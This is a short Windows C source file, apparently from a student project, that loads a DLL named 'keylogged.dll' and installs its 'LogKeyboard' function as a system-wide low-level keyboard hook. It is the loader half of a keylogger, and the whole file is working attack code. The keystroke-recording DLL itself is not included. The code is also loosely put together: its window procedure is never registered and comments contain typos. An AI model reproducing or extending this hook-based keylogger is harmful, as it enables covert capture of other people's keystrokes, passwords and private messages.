#include <Windows.h>

//Declare windows procedure
LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);

// Make class name into a global variable
char szClassName[] = "WindowsApp";
HINSTANCE hinstDLL;
HHOOK hHook = NULL;
typedef void (*LOADPROC) (HHOOK hHook);
int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE hPreInstance, LPSTR lpszArgument, int nFunsterStil) {

	hinstDLL = LoadLibrary("D:\\Truong\\DaMang\\Source-DoAn-Mang\\HDH\\code\\keylogged.dll");
	if (hinstDLL == NULL) {
		MessageBox(0, "Not found.", "Error", 0);
		return 0;
	}
	HOOKPROC hpr = (HOOKPROC)GetProcAddress(hinstDLL, "LogKeyboard");
	if (hpr == NULL) {
		MessageBox(0, "Unvail lib.", "Error", 0);
		return 0;
	}
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hpr, hinstDLL, 0);
	if (hHook == NULL) {
		MessageBox(0, "Corrupt lib.", "Error", 0);
		return 0;
	}
	LOADPROC lpr = (LOADPROC)GetProcAddress(hinstDLL, "SetGlobalHook");
	lpr(hHook);
	HWND hwnd; // this is handled for our window
	MSG messages; // Here Messages to the application are saved
	// Run message loop. It will run untill GetMessage() return 0
	while(GetMessage(&messages, NULL, 0, 0)) {
		// Translate virtual messages into character messages
		TranslateMessage(&messages);
		//Send messages to WindowProcedure
		DispatchMessage(&messages);
	}
	// the program return 0 - the value that PostQuitMassage() gave
	return messages.wParam;
}
// this fi=untion is called by the Windows Funtion DispatMessage()
LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		UnhookWindowsHookEx(hHook);
		hHook = NULL;
		break;
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
		break;
	}
	return 0;
}
